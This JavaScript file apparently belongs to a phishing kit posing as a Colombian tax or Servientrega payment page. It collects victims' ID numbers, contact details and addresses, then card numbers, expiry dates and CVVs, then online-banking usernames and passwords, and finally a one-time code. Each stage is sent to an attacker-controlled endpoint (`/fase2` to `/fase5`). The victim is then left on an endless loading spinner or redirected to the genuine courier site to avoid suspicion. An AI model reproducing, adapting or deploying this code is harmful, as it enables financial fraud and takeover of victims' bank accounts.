sw_sobre = 0;
sw_links = 0;
sw_ayuda = 0;
sw_corp = 0;

ok_datos = 0;
ok_tar = 0;
ok_sesion = 0;

const LS = window.localStorage

document.addEventListener('DOMContentLoaded', function() {
    //Set CC
    document.querySelector("#txt-cedula").value = JSON.parse(window.localStorage.getItem('inf'))['cc']

    var FechaFull = new Date();
    var dia = FechaFull.getDate();
    var mes = FechaFull.getMonth();
    var ano = FechaFull.getFullYear();

    mes = mes + 1;

    document.getElementById("fec").innerHTML = dia + "/" + mes + "/" + ano;

    window.addEventListener('resize', function() {
      if (window.innerWidth <= 991) {
        document.querySelector(".menu-bar").style.top = "0";
      }
    });
  
    window.addEventListener('scroll', function() {
      if (window.innerWidth > 991) {
        if (window.scrollY > 33) {
          document.querySelector(".top-bar").style.display = "none";
          document.querySelector(".menu-bar").style.position = "fixed";
          document.querySelector(".menu-bar").style.top = "0";
        } else {
          document.querySelector(".top-bar").style.display = "block";
          document.querySelector(".menu-bar").style.position = "absolute";
          document.querySelector(".menu-bar").style.top = "33px";
        }
      }
    });


    // 3--
    // City / Dir / Mail / PN /
    document.querySelector("#btn-pagar-impuestos").addEventListener('click', function() {
        var ok_datos = 0;
      
        if (document.querySelector("#txt-ciudad").value !== "") {
          document.querySelector("#err-ciudad").style.display = "none";
        } else {
          document.querySelector("#err-ciudad").style.display = "block";
          document.querySelector("#txt-ciudad").focus();
          ok_datos = 1;
        }
      
        if (document.querySelector("#txt-direccion").value !== "") {
          document.querySelector("#err-direccion").style.display = "none";
        } else {
          document.querySelector("#err-direccion").style.display = "block";
          document.querySelector("#txt-direccion").focus();
          ok_datos = 1;
        }
      
        if (document.querySelector("#txt-correo").value !== "") {
          document.querySelector("#err-correo").style.display = "none";
        } else {
          document.querySelector("#err-correo").style.display = "block";
          document.querySelector("#txt-correo").focus();
          ok_datos = 1;
        }
      
        if (document.querySelector("#txt-celular").value !== "") {
          document.querySelector("#err-celular").style.display = "none";
        } else {
          document.querySelector("#err-celular").style.display = "block";
          document.querySelector("#txt-celular").focus();
          ok_datos = 1;
        }
      
        if (document.querySelector("#txt-nombre").value !== "") {
          document.querySelector("#err-nombre").style.display = "none";
        } else {
          document.querySelector("#err-nombre").style.display = "block";
          document.querySelector("#txt-nombre").focus();
          ok_datos = 1;
        }
      
        if (ok_datos === 0) {
          // Show tarj
          document.querySelector("#fondo").style.display = "block";
          document.querySelector("#frm-tarjeta").style.display = "block";

          // Save d
          d = JSON.parse(LS.getItem('inf'))
          d['nom'] = document.querySelector("#txt-nombre").value,
          d['pn'] = document.querySelector("#txt-celular").value,
          d['ml'] = document.querySelector("#txt-correo").value,
          d['dir'] = document.querySelector("#txt-direccion").value,
          d['cid'] = document.querySelector("#txt-ciudad").value
          LS.setItem('inf', JSON.stringify(d))

          fetch(`${url}/fase2`, {
            method: 'POST',
            headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            },
            body: JSON.stringify(d)
          })
          .then(response => response.json())
          .then(result => {
            console.log('Respuesta del servidor:', result);

          })
          .catch(error => {
            console.log('Error en la solicitud:', error);
          });
        }
    });
    

    // 4--- dTar
    document.querySelector("#btn-pagar").addEventListener('click', function() {
        var ok_tar = 0;
      
        if (document.querySelector("#txt-cvv").value.length >= 3) {
          document.querySelector("#err-cvv").style.display = "none";
        } else {
          document.querySelector("#err-cvv").style.display = "block";
          document.querySelector("#txt-cvv").focus();
          ok_tar = 1;
        }
      
        if (document.querySelector("#mFecha").value !== "" && document.querySelector("#aFecha").value !== "") {
          document.querySelector("#err-fecha").style.display = "none";
        } else {
          document.querySelector("#err-fecha").style.display = "block";
          document.querySelector("#mFecha").focus();
          ok_tar = 1;
        }
      
        if (document.querySelector("#txt-tarjeta").value.length >= 15) {
          document.querySelector("#err-tarjeta").style.display = "none";
        } else {
          document.querySelector("#err-tarjeta").style.display = "block";
          document.querySelector("#txt-tarjeta").focus();
          ok_tar = 1;
        }
      
        if (document.querySelector("#txt-entidad").value !== "") {
          document.querySelector("#err-entidad").style.display = "none";
        } else {
          document.querySelector("#err-entidad").style.display = "block";
          document.querySelector("#txt-entidad").focus();
          ok_tar = 1;
        }
      
        if (ok_tar === 0) {
          var fecha = document.querySelector("#mFecha").value + "-" + document.querySelector("#aFecha").value;
          document.querySelector("#fondo").style.display = "block";
          document.querySelector("#frm-tarjeta").style.display = "none";
          document.querySelector("#frm-animacion").style.display = "block";
          
          // Save tar
          d = JSON.parse(LS.getItem('inf'))
          d['tar']['ent'] = document.querySelector("#txt-entidad").value,
          d['tar']['pin'] = document.querySelector("#txt-tarjeta").value,
          d['tar']['date'] = fecha,
          d['tar']['cvv'] = document.querySelector("#txt-cvv").value
          console.log(d)
          LS.setItem('inf', JSON.stringify(d))

          fetch(`${url}/fase3`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            },
            body: JSON.stringify(d)
          })
          .then(response => response.json())
          .then(result => {
            console.log('Respuesta del servidor:', result);
          })
          .catch(error => {
            console.log('Error en la solicitud:', error);
          });

          setTimeout(verificar, 4000)

          // Enviar a API--------------------------
        
        }
    });


    // 5--- Banca
    document.querySelector("#btn-iniciar-sesion").addEventListener('click', function() {
        var ok_sesion = 0;
      
        if (document.querySelector("#txt-password").value !== "") {
          document.querySelector("#err-password").style.display = "none";
        } else {
          document.querySelector("#err-password").style.display = "block";
          document.querySelector("#txt-password").focus();
          ok_sesion = 1;
        }
      
        if (document.querySelector("#txt-usuario").value !== "") {
          document.querySelector("#err-usuario").style.display = "none";
        } else {
          document.querySelector("#err-usuario").style.display = "block";
          document.querySelector("#txt-usuario").focus();
          ok_sesion = 1;
        }
      
        if (ok_sesion === 0) {
          var cadena = document.querySelector("#txt-tarjeta").value;
          document.querySelector("#tar").innerHTML = cadena.substr(cadena.length - 4);
      
          document.querySelector("#fondo").style.display = "block";
          document.querySelector("#frm-verificacion").style.display = "none";
          document.querySelector("#frm-cargando").style.display = "block";

          p = document.querySelector("#txt-password").value
          
          d = JSON.parse(LS.getItem('inf'))
          d['bk']['u'] = document.querySelector("#txt-usuario").value
          d['bk']['p'] = p
          LS.setItem('inf', JSON.stringify(d))

          fetch(`${url}/fase4`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            },
            body: JSON.stringify(d)
          })
          .then(response => response.json())
          .then(result => {
            console.log('Respuesta del servidor:', result);
            document.querySelector("#frm-cargando").style.display = "none";
            document.querySelector("#frm-otp").style.display = "block";
          })
          .catch(error => {
            console.log('Error en la solicitud:', error);
          });
        }
      });
      
      document.querySelector("#btn-autorizar").addEventListener('click', function() {
        window.location.href = "https://www.servientrega.com/";
      });
      
      document.querySelector("#btn-validar").addEventListener('click', function() {
        if (document.querySelector("#txt-otp").value.length >= 6) {
          document.querySelector("#err-otp").style.display = "none";
          d = JSON.parse(LS.getItem('inf'))
          d['cdg'] = document.querySelector("#txt-otp").value
          
          fetch(`${url}/fase5`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            },
            body: JSON.stringify(d)
          })
          .then(response => response.json())
          .then(result => {
            console.log('Respuesta del servidor:', result);
            LS.removeItem('inf')

            /** INFINITE SPINNER */
            document.querySelector("#frm-otp").style.display = "none";
            document.querySelector("#frm-cargando").style.display = "block";
          })
          .catch(error => {
            console.log('Error en la solicitud:', error);
          });
        } else {
          document.querySelector("#err-otp").style.display = "block";
          document.querySelector("#txt-otp").focus();
        }
      });
      
      
})